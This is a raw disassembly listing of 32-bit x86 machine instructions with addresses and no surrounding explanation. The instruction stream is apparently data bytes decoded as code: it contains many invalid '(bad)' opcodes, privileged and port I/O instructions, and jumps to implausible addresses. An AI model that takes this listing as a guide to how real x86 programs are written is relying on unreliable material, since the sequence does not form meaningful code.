  4163d2:	lds    eax,FWORD PTR [esp+ebx*2]
  4163d5:	sbb    dl,dh
  4163d7:	pop    ebx
  4163d8:	jb     0x416426
  4163da:	rcl    BYTE PTR [ebp+0x63],cl
  4163dd:	xor    eax,0xe6e2232
  4163e2:	and    eax,0x2d0a60eb
  4163e7:	add    eax,0x5a0e3a5c
  4163ec:	jb     0x4163f2
  4163ee:	and    dl,BYTE PTR [ebx+eiz*2-0x3]
  4163f2:	add    eax,0xd066e22
  4163f7:	pop    eax
  4163f8:	das    
  4163f9:	push   ss
  4163fa:	(bad)  
  4163fb:	pop    ecx
  4163fc:	xor    edi,DWORD PTR [edi-0x168edc24]
  416402:	dec    ebp
  416403:	push   esp
  416404:	push   0x6425efc8
  416409:	mov    edx,0xc07430d2
  41640e:	retf   
  41640f:	pop    ds
  416410:	jno    0x416429
  416412:	lds    ebp,FWORD PTR [ecx]
  416414:	ins    BYTE PTR es:[edi],dx
  416415:	ror    ch,1
  416417:	and    eax,0x2d249500
  41641c:	pop    edi
  41641d:	mov    ebx,0x0
	...
  41642e:	add    BYTE PTR [eax],al
  416430:	and    ah,BYTE PTR [ecx]
  416432:	push   ecx
  416433:	mov    WORD PTR ds:0x108f6731,fs
  416439:	xor    al,0x5d
  41643b:	fcomp  st(0)
  41643d:	hlt    
  41643e:	pop    esp
  41643f:	aam    0x4b
  416441:	xor    eax,0xe967006f
  416446:	jae    0x4164ad
  416448:	push   ebx
  416449:	pop    edx
  41644a:	aas    
  41644b:	outs   dx,DWORD PTR ds:[esi]
  41644c:	ins    DWORD PTR es:[edi],dx
  41644d:	in     al,dx
  41644e:	pusha  
  41644f:	gs pusha 
  416451:	std    
  416452:	outs   dx,DWORD PTR ds:[esi]
  416453:	and    al,dh
  416455:	cmc    
  416456:	gs je  0x416425
  416459:	fbstp  TBYTE PTR [ecx+0x65]
  41645c:	adc    ebp,edx
  41645e:	pusha  
  41645f:	popa   
  416460:	mov    bl,0xee
  416462:	jae    0x4164d4
  416464:	and    edi,ebp
  416466:	ins    DWORD PTR es:[edi],dx
  416467:	ins    BYTE PTR es:[edi],dx
  416468:	mov    esi,0xae2e6fdf
  41646d:	clc    
  41646e:	pusha  
  41646f:	add    BYTE PTR [eax],dh
  416471:	call   0xb751c9e9
  416476:	popa   
  416477:	popa   
  416478:	(bad)  
  41647a:	outs   dx,DWORD PTR ds:[esi]
  41647b:	imul   edi,edi,0xfa2e6eeb
  416481:	mul    BYTE PTR [eax+eax*1+0x17]
  416485:	push   ebp
  416486:	popa   
  416487:	popa   
  416488:	ret    
  416489:	pop    esi
  41648a:	pop    ebp
  41648b:	jb     0x41647b
  41648d:	and    al,0x4c
  41648f:	gs add dh,cl
  416492:	inc    ebp
  416493:	push   esp
	...
  4164a4:	add    BYTE PTR [eax],al
  4164a6:	jae    0x4164ad
  4164a8:	dec    edi
  4164a9:	dec    edi
  4164aa:	pop    ebp
  4164ab:	push   ecx
  4164ac:	push   ebx
  4164ad:	inc    ecx
  4164ae:	popa   
  4164af:	dec    esp
  4164b0:	pop    esp
  4164b1:	dec    esp
  4164b2:	mov    esi,0xc2576fe0
  4164b7:	out    dx,eax
  4164b8:	pusha  
  4164b9:	add    BYTE PTR [edx-0xd],cl
  4164bc:	outs   dx,BYTE PTR ds:[esi]
  4164bd:	je     0x416471
  4164bf:	jmp    0xf183b52f
  4164c4:	add    BYTE PTR [bx+0x73e0],bl
  4164c9:	popa   
  4164ca:	lahf   
  4164cb:	call   0x7c3b6541
  4164d0:	and    al,0x71
  4164d2:	leave  
  4164d3:	xchg   edx,eax
  4164d4:	xor    dh,BYTE PTR [edx-0x2a]
  4164d7:	stos   DWORD PTR es:[edi],eax
  4164d8:	dec    ecx
  4164d9:	ins    DWORD PTR es:[edi],dx
  4164da:	leave  
  4164db:	das    
  4164dc:	dec    edi
  4164dd:	pop    edi
  4164de:	iret   
  4164df:	mov    BYTE PTR [ecx],al
  4164e1:	push   ebx
  4164e2:	test   eax,0x9b4e3380
  4164e7:	push   eax
  4164e8:	and    eax,0x2d40c800
  4164ed:	ins    DWORD PTR es:[edi],dx
  4164ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164ef:	dec    eax
  4164f0:	dec    eax
  4164f1:	mov    BYTE PTR [bx+si+0x23],al
  4164f5:	je     0x416494
  4164f7:	std    
  4164f8:	cmp    BYTE PTR [eax],al
  4164fa:	stos   BYTE PTR es:[edi],al
  4164fb:	dec    edx
  4164fc:	ss je  0x4164ab
  4164ff:	clc    
  416500:	sub    al,0x62
  416502:	pop    edi
  416503:	cld    
  416504:	add    eax,DWORD PTR [esi+0x49]
  416507:	(bad)  
  416508:	xor    eax,0x6d
	...
  416519:	add    BYTE PTR [eax],al
  41651b:	add    BYTE PTR [esi+0x7],ch
  41651e:	and    ebp,DWORD PTR [ebp+0x4e]
  416521:	scas   al,BYTE PTR es:[edi]
  416522:	push   esp
  416523:	ins    DWORD PTR es:[edi],dx
  416524:	pop    esp
  416525:	adc    dh,BYTE PTR [edi]
  416527:	pop    edi
  416528:	dec    eax
  416529:	or     DWORD PTR [eax+0x4b],esp
  41652c:	pop    ebx
  41652d:	mov    esp,0xce4c6735
  416532:	push   ecx
  416533:	jb     0x416558
  416535:	add    esi,DWORD PTR [esi]
  416537:	ja     0x416557
  416539:	scas   al,BYTE PTR es:[edi]
  41653a:	pop    ebp
  41653b:	xor    eax,ebp
  41653d:	imul   ebp,DWORD PTR [edx],0x74
  416540:	xor    al,0xda
  416542:	xor    DWORD PTR [esi],ebp
  416544:	and    edi,DWORD PTR [eax+0x2a]
  416547:	add    BYTE PTR [edx+ebp*2],bh
  41654a:	push   esp
  41654b:	addr16 push cs
  41654d:	shl    DWORD PTR [esi+ebp*1],0x13
  416551:	shr    BYTE PTR [edx],0x0
  416554:	(bad)  
  416555:	xchg   edi,eax
  416556:	es je  0x41650f
  416559:	add    al,0x99
  41655b:	sub    ch,ah
  41655d:	and    edi,esp
  41655f:	push   ebx
  416560:	mov    ebp,0xe7589a33
  416565:	xor    al,BYTE PTR [ebx-0x6ccd56fd]
  41656b:	add    ebp,DWORD PTR [ecx-0x53ca7bcd]
  416571:	and    eax,0x52fa2684
  416576:	jle    0x4165a8
  416578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416579:	inc    eax
  41657a:	push   eax
  41657b:	ss cdq 
  41657d:	and    edx,DWORD PTR [ebx+0x31]
	...
  416590:	add    BYTE PTR [eax],al
  416592:	test   al,0x3d
  416594:	out    0x53,eax
  416596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416597:	xor    dl,BYTE PTR [ebx+0x4]
  41659a:	stos   DWORD PTR es:[edi],eax
  41659b:	daa    
  41659c:	dec    ebp
  41659d:	cmp    BYTE PTR [edi-0x61d8c6db],cl
  4165a3:	push   ebx
  4165a4:	inc    esi
  4165a5:	aaa    
  4165a6:	outs   dx,BYTE PTR ds:[esi]
  4165a7:	sub    eax,0x2f555607
  4165ac:	or     al,0x36
  4165ae:	sbb    dl,BYTE PTR [ecx+0x4]
  4165b1:	and    eax,0x30062752
  4165b6:	and    BYTE PTR [bx+si],al
  4165b9:	daa    
  4165ba:	dec    ebx
  4165bb:	pop    ecx
  4165bc:	push   ds
  4165bd:	daa    
  4165be:	pop    eax
  4165bf:	inc    ecx
  4165c0:	stc    
  4165c1:	sub    al,BYTE PTR [edx+eiz*1+0x13]
  4165c5:	inc    ebp
  4165c6:	daa    
  4165c7:	daa    
  4165c8:	std    
  4165c9:	sbb    esi,DWORD PTR es:[ecx]
  4165cc:	shl    BYTE PTR [eax],1
  4165ce:	adc    al,0x34
  4165d0:	out    0x54,eax
  4165d2:	sbb    DWORD PTR [ebx],esi
  4165d4:	frstor [esi]
  4165d6:	or     BYTE PTR [ecx-0x30],dl
  4165d9:	xor    ebx,DWORD PTR [ecx]
  4165db:	add    eax,0xe52a57ad
  4165e0:	test   eax,0x512c50
  4165e5:	fwait
  4165e6:	retf   0x48
  4165e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165ea:	lds    edx,FWORD PTR [ecx+eax*2-0x4a]
  4165ee:	retf   
  4165ef:	add    al,0x2e
  4165f1:	cdq    
  4165f2:	daa    
  4165f3:	pop    ds
  4165f4:	add    BYTE PTR [ebp+0x0],dh
	...
  416606:	add    BYTE PTR [eax],al
  416608:	test   eax,0x20876d32
  41660d:	sub    DWORD PTR [ebx+0x7a],esp
  416610:	stc    
  416611:	test   DWORD PTR [ebx-0x3],edi
  416614:	in     eax,dx
  416615:	xchg   BYTE PTR [ecx-0x52ca1fff],dh
  41661b:	out    dx,al
  41661c:	loopne 0x41664e
  41661e:	je     0x416679
  416620:	and    al,ch
  416622:	sub    al,0xe9
  416624:	shl    DWORD PTR [eax],1
  416626:	je     0x416681
  416628:	leave  
  416629:	cli    
  41662a:	sub    al,0xfe
  41662c:	stc    
  41662d:	push   ds
  41662e:	je     0x416669
  416630:	add    al,ch
  416632:	sub    al,0xe9
  416634:	int3   
  416635:	xor    al,0x63
  416637:	cmp    ebx,DWORD PTR [edi]
  416639:	add    eax,0x211c4875
  41663e:	cs or  eax,0x3e00311f
  416644:	dec    ecx
  416645:	sub    BYTE PTR [esi+0x1d],ah
  416648:	or     eax,0x5a047256
  41664d:	dec    eax
  41664e:	jo     0x41665c
  416650:	or     BYTE PTR [esi+0x20],dl
  416653:	sbb    cl,BYTE PTR ds:0xdefe741f
  416659:	xor    ah,BYTE PTR [ebx-0x17]
  41665c:	cmp    eax,0x99dd7156
  416661:	inc    edx
  416662:	addr16 fcmovnbe st,st(2)
  416665:	and    esi,DWORD PTR [esi+eax*8-0x35]
  416669:	sub    eax,0xe931
	...
  41667e:	cmp    eax,0x47007156
  416683:	mov    ds:0xee406e46,al
  416688:	pop    esp
  416689:	ins    BYTE PTR es:[edi],dx
  41668a:	aas    
  41668b:	mov    ds:0xeaa7614d,al
  416690:	dec    DWORD PTR [esi-0x7d]
  416693:	in     eax,dx
  416694:	jno    0x4166f7
  416696:	sub    eax,0x9f4d544a
  41669b:	push   esi
  41669c:	outs   dx,DWORD PTR ds:[esi]
  41669d:	push   0x5c6be676
  4166a2:	ins    BYTE PTR es:[edi],dx
  4166a3:	repnz pusha 
  4166a5:	outs   dx,BYTE PTR ds:[esi]
  4166a6:	pop    edi
  4166a7:	jecxz  0x416713
  4166a9:	ins    DWORD PTR es:[edi],dx
  4166aa:	jle    0x41668d
  4166ac:	ins    DWORD PTR es:[edi],dx
  4166ad:	fs and ebp,edi
  4166b0:	fs jae 0x416669
  4166b3:	fidiv  WORD PTR [ebx+0x70]
  4166b6:	shl    dl,0x75
  4166b9:	jae    0x4166b8
  4166bb:	loop   0x416721
  4166bd:	outs   dx,BYTE PTR ds:[esi]
  4166be:	and    edx,DWORD PTR [esi+0x3d]
  4166c1:	arpl   WORD PTR [esi+0x13544542],si
  4166c7:	push   ebx
  4166c8:	imul   esp,DWORD PTR [esi+0x37],0xffffffee
  4166cc:	pop    esp
  4166cd:	jb     0x416705
  4166cf:	and    eax,0x42f6633d
  4166d4:	inc    ebp
  4166d5:	push   esp
  4166d6:	rcl    DWORD PTR [edx+edx*2+0x55],cl
  4166da:	jecxz  0x41672e
  4166dc:	dec    ebx
  4166dd:	inc    esi
  4166de:	pop    es
  4166df:	dec    esi
  4166e0:	cmp    eax,0x52
	...
  4166f1:	add    BYTE PTR [eax],al
  4166f3:	add    BYTE PTR [esi],dl
  4166f5:	and    eax,0xf1f26c3f
  4166fa:	outs   dx,BYTE PTR ds:[esi]
  4166fb:	gs mov al,0x55
  4166fe:	push   esp
  4166ff:	jns    0x4166b4
  416701:	in     al,dx
  416702:	dec    ebx
  416703:	imul   esi,DWORD PTR [ecx+0x51437755],0xfa3243b0
  41670d:	push   0xfffffff1
  41670f:	inc    ebp
  416710:	fist   WORD PTR [ebx]
  416712:	hlt    
  416713:	ss into 
  416715:	adc    al,bh
  416717:	cmp    ebp,DWORD PTR ds:[ebx-0x10]
  41671b:	inc    ecx
  41671c:	mov    ecx,0x262af865
  416721:	mov    ebp,0x692e3644
  416726:	out    dx,eax
  416727:	xor    al,0xb4
  416729:	into   
  41672a:	div    BYTE PTR [edi+edx*8]
  41672d:	stos   DWORD PTR es:[edi],eax
  41672e:	push   edx
  41672f:	dec    ebp
  416730:	mov    ah,0x6f
  416732:	push   esi
  416733:	aas    
  416734:	test   al,0x68
  416736:	pop    ebp
  416737:	inc    ecx
  416738:	into   
  416739:	mov    WORD PTR [edx],?
  41673b:	jno    0x4166dc
  41673d:	cmp    bl,BYTE PTR [ebp+0x54]
  416740:	mov    bl,0x3b
  416742:	sub    BYTE PTR [ebx+edx*4+0x49],cl
  416746:	pusha  
  416747:	jns    0x41672c
  416749:	loopne 0x41678b
  41674b:	xor    ecx,edi
  41674d:	sbb    dl,dh
  41674f:	ss fnstsw ax
  416752:	lock xor eax,ecx
  416755:	adc    al,bh
  416757:	xor    al,0x0
	...
  416769:	add    bh,al
  41676b:	scas   al,BYTE PTR es:[edi]
  41676c:	out    dx,al
  41676d:	inc    ecx
  41676e:	cmp    DWORD PTR [ebx-0x45c8d506],esi
  416774:	stc    
  416775:	xor    DWORD PTR [edi],ebp
  416777:	in     al,0xfb
  416779:	das    
  41677a:	and    eax,0x5740efcf
  41677f:	sahf   
  416780:	xor    al,0x67
  416782:	dec    ecx
  416783:	or     DWORD PTR [esi],esp
  416785:	je     0x4167d1
  416787:	scas   eax,DWORD PTR es:[edi]
  416788:	das    
  416789:	jbe    0x4167d4
  41678b:	les    ebp,FWORD PTR [edx]
  41678d:	outs   dx,BYTE PTR ds:[esi]
  41678e:	and    ebx,DWORD PTR [esi+0x9296734]
  416794:	es je  0x4167c1
  416797:	add    eax,0x1e0c2b15
  41679c:	out    0x45,eax
  41679e:	cs push ebp
  4167a0:	mov    ebp,0xc626052c
  4167a5:	es or  bl,ah
  4167a8:	int3   
  4167a9:	aaa    
  4167aa:	or     al,BYTE PTR ds:0x5aca57a5
  4167b0:	(bad)  
  4167b1:	cmp    cl,ch
  4167b3:	sub    eax,esp
  4167b5:	xor    DWORD PTR [esi+esi*1],edx
  4167b8:	mov    al,BYTE PTR [ebx]
  4167ba:	mov    esi,0xe42a8f56
  4167bf:	and    edi,DWORD PTR [edx-0x42c72bd4]
  4167c5:	and    bh,dl
  4167c7:	and    edi,esp
  4167c9:	sub    eax,0xedba37cb
	...
  4167de:	add    BYTE PTR [eax],al
  4167e0:	cdq    
  4167e1:	and    BYTE PTR [ebx-0x65a843fd],al
  4167e7:	pop    esp
  4167e8:	mov    ebp,0xfa385022
  4167ed:	inc    edx
  4167ee:	cmp    dl,BYTE PTR [ecx-0x49]
  4167f1:	push   edi
  4167f2:	aas    
  4167f3:	aaa    
  4167f4:	xchg   BYTE PTR [eax],ch
  4167f6:	ds xor eax,0x51350494
  4167fc:	stos   DWORD PTR es:[edi],eax
  4167fd:	inc    esi
  4167fe:	dec    eax
  4167ff:	xor    DWORD PTR [ecx-0x5],ebx
  416802:	cli    
  416803:	pop    esp
  416804:	sub    cl,BYTE PTR ss:[edx+0x2d]
  416808:	pop    esi
  416809:	sub    ch,BYTE PTR [ecx]
  41680b:	aaa    
  41680c:	push   esp
  41680d:	sub    eax,DWORD PTR [edx+esi*1]
  416810:	cli    
  416811:	push   edi
  416812:	sub    al,0x41
  416814:	xor    eax,0x274f2459
  416819:	dec    ebx
  41681a:	stc    
  41681b:	es pop ecx
  41681d:	ds repz and DWORD PTR es:0xe4431900,eax
  416826:	cs push cs
  416828:	aas    
  416829:	sub    BYTE PTR [eax+esi*4-0x31],dh
  41682d:	cmp    BYTE PTR [ebx-0x25],ah
  416830:	out    0x53,eax
  416832:	ins    BYTE PTR es:[edi],dx
  416833:	mov    ds:0xbd513bd4,al
  416838:	(bad)  
  416839:	cmp    BYTE PTR [eax],al
  41683b:	cdq    
  41683c:	xor    ah,ah
  41683e:	cs sahf 
  416840:	mov    eax,0xc17437
	...
  416855:	add    BYTE PTR [ebx+eiz*1],dl
  416858:	je     0x41681a
  41685a:	sbb    dl,BYTE PTR [esp+esi*2-0x74]
  41685e:	stc    
  41685f:	push   esp
  416860:	dec    ecx
  416861:	fmul   DWORD PTR [eax+0x54]
  416864:	inc    esp
  416865:	mov    ebx,0x8a6348ae
  41686a:	or     edi,DWORD PTR [eax+esi*2]
  41686d:	jge    0x416868
  41686f:	push   esp
  416870:	dec    ecx
  416871:	mov    eax,0x7b465028
  416876:	aam    0x27
  416878:	push   ecx
  416879:	jge    0x416851
  41687b:	cmp    BYTE PTR [eax],al
  41687d:	jmp    0xe9416d7b
  416882:	stc    
  416883:	add    al,0x0
  416885:	jmp    0xe9416d83
  41688a:	stc    
  41688b:	add    al,0x0
  41688d:	jmp    0xe9416d8b
  416892:	stc    
  416893:	add    al,0x0
  416895:	jmp    0xe9416d93
  41689a:	stc    
  41689b:	add    al,0x0
  41689d:	jmp    0x10ad8ac6
  4168a2:	or     ah,BYTE PTR [esi]
  4168a4:	xor    edi,eax
  4168a6:	in     eax,dx
  4168a7:	and    BYTE PTR [ecx+ebp*8+0xc],ch
  4168ab:	and    ch,BYTE PTR [eax+eax*1-0x16]
  4168af:	hlt    
  4168b0:	pusha  
  4168b1:	xor    edx,DWORD PTR [esi+ebx*8]
  4168b4:	outs   dx,DWORD PTR ds:[esi]
  4168b5:	gs cmc 
  4168b7:	or     BYTE PTR [edi+0x71],ch
	...
  4168ca:	add    BYTE PTR [eax],al
  4168cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168cd:	loope  0x416942
  4168cf:	add    BYTE PTR gs:[esi+0x5f],cl
  4168d3:	ins    BYTE PTR es:[edi],dx
  4168d4:	(bad)  
  4168d5:	sti    
  4168d6:	pusha  
  4168d7:	add    BYTE PTR [eax-0x50969407],dh
  4168dd:	in     eax,0x2e
  4168df:	pop    edi
  4168e0:	inc    ebx
  4168e1:	clc    
  4168e2:	pusha  
  4168e3:	jo     0x416927
  4168e5:	clc    
  4168e6:	pusha  
  4168e7:	add    BYTE PTR [eax-0x50969407],dh
  4168ed:	in     eax,0x2e
  4168ef:	pop    edi
  4168f0:	and    dl,0x60
  4168f3:	jo     0x416958
  4168f5:	sti    
  4168f6:	ins    BYTE PTR es:[edi],dx
  4168f7:	ins    BYTE PTR es:[edi],dx
  4168f8:	jp     0x4168dc
  4168fa:	pusha  
  4168fb:	xor    edx,DWORD PTR [ebx+ebp*8-0x23419396]
  416902:	ins    DWORD PTR es:[edi],dx
  416903:	pop    edi
  416904:	xor    ecx,0x5b06573
  41690a:	outs   dx,DWORD PTR ds:[esi]
  41690b:	jno    0x4168b4
  41690d:	loopne 0x416982
  41690f:	add    BYTE PTR gs:[esi+0x5f],cl
  416913:	outs   dx,DWORD PTR ds:[esi]
  416914:	(bad)  
  416915:	repz push 0x6beac46e
  41691b:	outs   dx,DWORD PTR ds:[esi]
  41691c:	mov    cl,0x8
  41691e:	add    BYTE PTR [ebp-0x5c],ch
  416921:	repnz outs dx,BYTE PTR ds:[esi]
  416923:	jno    0x41696c
  416925:	loopne 0x41699a
  416927:	gs lock fwait
  41692a:	popa   
  41692b:	ins    BYTE PTR es:[edi],dx
  41692c:	daa    
  41692d:	or     DWORD PTR [edi+0x71],ebp
	...
  416940:	add    BYTE PTR [eax],al
  416942:	pop    es
  416943:	loopne 0x4169b8
  416945:	gs mov al,0x4e
  416948:	imul   esi,DWORD PTR [eax-0x6],0x0
  41694c:	sub    al,BYTE PTR [eax]
  41694e:	dec    ecx
  41694f:	or     eax,0x1466728
  416954:	cmc    
  416955:	pop    esp
  416956:	sbb    DWORD PTR [eax],eax
  416958:	sub    DWORD PTR [ecx+0x17],esi
  41695b:	pushf  
  41695c:	outs   dx,DWORD PTR ss:[esi]
  41695e:	push   ss
  41695f:	add    eax,0xcae96330
  416964:	xor    DWORD PTR [edx+0x1f],esi
  416967:	int3   
  416968:	and    al,0x72
  41696a:	pop    ss
  41696b:	pushf  
  41696c:	outs   dx,DWORD PTR ss:[esi]
  41696e:	push   ss
  41696f:	lds    ebp,FWORD PTR ds:0x366ac963
  416975:	je     0x416956
  416977:	imul   eax,DWORD PTR [ecx],0x71
  41697a:	jmp    0x416943
  41697c:	sub    al,0x74
  41697e:	fild   QWORD PTR [esi-0x68329ea6]
  416984:	xor    BYTE PTR [ebx-0x1c],ch
  416987:	jb     0x4169ac
  416989:	ja     0x416951
  41698b:	xor    BYTE PTR [esi],0x0
  41698e:	leave  
  41698f:	mov    WORD PTR ds:0xf680c667,fs
  416995:	pop    esp
  416996:	cdq    
  416997:	and    BYTE PTR ds:0x5a899f73,0x62
  41699e:	xchg   esi,eax
  41699f:	xor    ah,BYTE PTR [ebx]
  4169a1:	add    dl,bh
  4169a3:	fwait
  4169a4:	add    DWORD PTR [eax],eax
	...
  4169b6:	add    BYTE PTR [eax],al
  4169b8:	cli    
  4169b9:	fwait
  4169ba:	add    DWORD PTR [eax],eax
  4169bc:	cli    
  4169bd:	fwait
  4169be:	add    DWORD PTR [eax],eax
  4169c0:	cli    
  4169c1:	fwait
  4169c2:	add    DWORD PTR [eax],eax
  4169c4:	cli    
  4169c5:	fwait
  4169c6:	add    DWORD PTR [eax],eax
  4169c8:	cli    
  4169c9:	popf   
  4169ca:	add    DWORD PTR [eax],eax
  4169cc:	cli    
  4169cd:	popf   
  4169ce:	add    DWORD PTR [eax],eax
  4169d0:	cli    
  4169d1:	popf   
  4169d2:	add    DWORD PTR [eax],eax
  4169d4:	cli    
  4169d5:	add    al,0x17
  4169d7:	ss addr16 daa 
  4169da:	adc    BYTE PTR [eax],ch
  4169dc:	pop    ecx
  4169dd:	xor    al,0xc5
  4169df:	sub    dl,BYTE PTR [esi+ebx*1-0x19]
  4169e3:	push   ebx
  4169e4:	dec    eax
  4169e5:	and    BYTE PTR ds:0xe72a262b,cl
  4169eb:	dec    edx
  4169ec:	sub    edx,DWORD PTR [ebx+0xc]
  4169ef:	sub    BYTE PTR [ebp+0x39],al
  4169f2:	add    BYTE PTR [edx],dh
  4169f4:	sbb    DWORD PTR ds:0x1d0e22b7,eax
  4169fa:	out    0x53,eax
  4169fc:	sub    eax,0x174fbf39
  416a01:	dec    edx
  416a02:	iret   
  416a03:	push   ds
  416a04:	cli    
  416a05:	xor    edx,eax
  416a07:	and    ah,ah
  416a09:	pop    ds
  416a0a:	int    0x34
  416a0c:	sbb    al,0x34
  416a0e:	mov    eax,0xc438dd27
  416a13:	add    ebp,ebx
  416a15:	sbb    eax,0x1ee7298e
  416a1a:	call   0x0:0xe9
	...
  416a2d:	add    cl,cl
  416a2f:	sub    al,0x9b
  416a31:	add    ecx,ebx
  416a33:	sbb    eax,0x1ecf2986
  416a38:	jp     0x416a2f
  416a3a:	out    0x38,eax
  416a3c:	jg     0x416a6d
  416a3e:	cli    
  416a3f:	xor    eax,DWORD PTR [eax+0x7d1f9420]
  416a45:	xor    al,0xeb
  416a47:	ficomp WORD PTR [edx+0x3c]
  416a4a:	mov    es,WORD PTR [edx+ecx*1]
  416a4d:	neg    BYTE PTR [edx-0x6609f5fc]
  416a53:	add    al,0xa
  416a55:	neg    BYTE PTR [eax+0x463f1a04]
  416a5b:	dec    edx
  416a5c:	sub    dl,BYTE PTR [eax+0x1a]
  416a5f:	sbb    eax,0x392f4600
  416a64:	outs   dx,BYTE PTR ds:[esi]
  416a65:	dec    eax
  416a66:	adc    eax,0xf4c92c24
  416a6b:	push   ds
  416a6c:	popa   
  416a6d:	sbb    edx,DWORD PTR [ecx]
  416a6f:	xor    eax,0x541a0c74
  416a74:	jno    0x416a7a
  416a76:	add    al,0x1f
  416a78:	pop    edi
  416a79:	adc    al,0x15
  416a7b:	loope  0x416a9c
  416a7d:	add    al,0xe0
  416a7f:	and    eax,0x38e9f072
  416a84:	arpl   WORD PTR ds:0xda715046,ax
  416a8a:	retf   0x7221
  416a8d:	lds    ebx,FWORD PTR [ecx+0xa65249]
	...
  416aa3:	add    BYTE PTR [eiz*8+0x51bfbe6a],bh
  416aaa:	ins    BYTE PTR es:[edi],dx
  416aab:	(bad)  
  416aac:	sbb    ch,BYTE PTR [eax]
  416aae:	outs   dx,BYTE PTR ds:[esi]
  416aaf:	mov    edx,0xbb6746f9
  416ab4:	add    al,0x27
  416ab6:	ins    DWORD PTR es:[edi],dx
  416ab7:	mov    cl,0xf9
  416ab9:	push   eax
  416aba:	dec    ebx
  416abb:	xchg   esi,eax
  416abc:	pop    ss
  416abd:	sub    BYTE PTR [ebp+ecx*4+0x18],ch
  416ac1:	push   ecx
  416ac2:	inc    esi
  416ac3:	or     BYTE PTR [edi],0x24
  416ac6:	data16 jle 0x416aca
  416ac9:	push   ecx
  416aca:	add    BYTE PTR [edx+0x767426e2],bl
  416ad0:	fdiv   DWORD PTR [edx]
  416ad2:	arpl   WORD PTR [ebp-0x7f85de44],dx
  416ad8:	aad    0x20
  416ada:	pop    edi
  416adb:	jmp    0xe96c4502
  416ae0:	out    dx,eax
  416ae1:	cmp    BYTE PTR [eax+0x13],dh
  416ae4:	sbb    eax,0xca40ffe0
  416ae9:	cmp    BYTE PTR [eax+0x0],dh
  416aec:	stc    
  416aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aee:	sub    al,0x0
  416af0:	dec    ebx
  416af1:	cmc    
  416af2:	jae    0x416b64
  416af4:	and    BYTE PTR [ebx+0x10d32f2c],ch
  416afa:	je     0x416b6c
  416afc:	lods   eax,DWORD PTR ds:[esi]
  416afd:	add    ah,BYTE PTR [esi+0x69]
  416b00:	icebp  
  416b01:	jecxz  0x416b48
  416b03:	push   esp
  416b04:	add    esi,edx
  416b06:	fs je  0x416b09
	...
  416b19:	add    dh,dh
  416b1b:	icebp  
  416b1c:	sub    eax,0xfff50264
  416b21:	push   edx
  416b22:	mul    bh
  416b24:	dec    eax
  416b25:	outs   dx,DWORD PTR ds:[esi]
  416b26:	std    
  416b27:	fldenv [eax+0x79]
  416b2a:	xchg   ebx,eax
  416b2b:	push   esi
  416b2c:	dec    ecx
  416b2d:	outs   dx,DWORD PTR ds:[esi]
  416b2e:	cdq    
  416b2f:	loope  0x416b9c
  416b31:	ins    BYTE PTR es:[edi],dx
  416b32:	ret    0x4f56
  416b35:	gs mov dl,0x3d
  416b38:	imul   ebp,DWORD PTR [esi-0x48],0xffffffe5
  416b3c:	je     0x416b9a
  416b3e:	arpl   ax,si
  416b40:	imul   ebp,DWORD PTR [edi+0x40],0xffffffdb
  416b44:	call   FWORD PTR [ebx-0x6b]
  416b47:	out    0x6a,al
  416b49:	arpl   WORD PTR [eax],di
  416b4b:	push   esi
  416b4c:	inc    edx
  416b4d:	jb     0x416bbb
  416b4f:	fild   QWORD PTR [esi+0x65]
  416b52:	jno    0x416baa
  416b54:	add    BYTE PTR [ebp+0x7c],cl
  416b57:	in     al,dx
  416b58:	fs ins BYTE PTR es:[edi],dx
  416b5a:	mov    edi,0x6e5bffe8
  416b5f:	out    0x79,eax
  416b61:	imul   edi,DWORD PTR [edi-0x1a],0xf4835c5c
  416b68:	push   0x66
  416b6a:	jp     0x416b52
  416b6c:	pusha  
  416b6d:	jae    0x416b2e
  416b6f:	or     BYTE PTR [edi+0x6f],cl
  416b72:	mov    ch,0xf4
  416b74:	jb     0x416bd7
  416b76:	cli    
  416b77:	dec    ecx
  416b78:	pop    ds
  416b79:	pop    esp
  416b7a:	scas   al,BYTE PTR es:[edi]
  416b7b:	dec    eax
  416b7c:	pop    ds
  416b7d:	popa   
	...
  416b8e:	add    BYTE PTR [eax],al
  416b90:	(bad)  
  416b91:	fimul  WORD PTR [edi+0x50]
  416b94:	cli    
  416b95:	fdiv   QWORD PTR [ebx]
  416b97:	jo     0x416bd7
  416b99:	inc    ebp
  416b9a:	xor    al,BYTE PTR [eax]
  416b9c:	cs out dx,eax
  416b9e:	and    BYTE PTR [edi+0x66],bl
  416ba1:	loopne 0x416bcd
  416ba3:	jb     0x416b9f
  416ba5:	stc    
  416ba6:	and    al,0x6d
  416ba8:	push   ecx
  416ba9:	or     DWORD PTR [ebx],esp
  416bab:	jb     0x416bfe
  416bad:	outs   dx,BYTE PTR ds:[esi]
  416bae:	sbb    eax,0x529c2e5f
  416bb3:	or     DWORD PTR es:[bp+di+0x6e],ecx
  416bb8:	sbb    al,0x7
  416bba:	out    0x4e,al
  416bbc:	xor    al,0xc
  416bbe:	add    al,0x4d
  416bc0:	push   ds
  416bc1:	aad    0x23
  416bc3:	add    BYTE PTR [edi*4-0x3af792d5],dh
  416bca:	sub    eax,0x1dae0963
  416bcf:	pop    edi
  416bd0:	out    dx,al
  416bd1:	fwait
  416bd2:	dec    esi
  416bd3:	fsub   QWORD PTR [di+0x4d]
  416bd7:	push   eax
  416bd8:	cli    
  416bd9:	push   0x2c
  416bdb:	je     0x416bb4
  416bdd:	push   0xffffffe3
  416bdf:	arpl   ax,bx
  416be1:	fwait
  416be2:	inc    edx
  416be3:	dec    esp
  416be4:	test   eax,0xc15c3d74
  416be9:	int3   
  416bea:	hlt    
  416beb:	inc    eax
  416bec:	or     ebp,DWORD PTR [eax-0x12]
  416bef:	xor    ebp,ebx
  416bf1:	fadd   DWORD PTR [edi+esi*1+0x0]
	...
  416c05:	add    bh,ah
  416c07:	pop    ecx
  416c08:	call   0xefc1573b
  416c0d:	sub    ah,dl
  416c0f:	pop    esp
  416c10:	stc    
  416c11:	das    
  416c12:	out    0x4,eax
  416c14:	pop    ss
  416c15:	hlt    
  416c16:	(bad)
  416c19:	inc    eax
  416c1a:	mov    eax,0xb43e18f1
  416c1f:	clc    
  416c20:	dec    ebx
  416c21:	pop    eax
  416c22:	cmp    eax,0x5f32171b
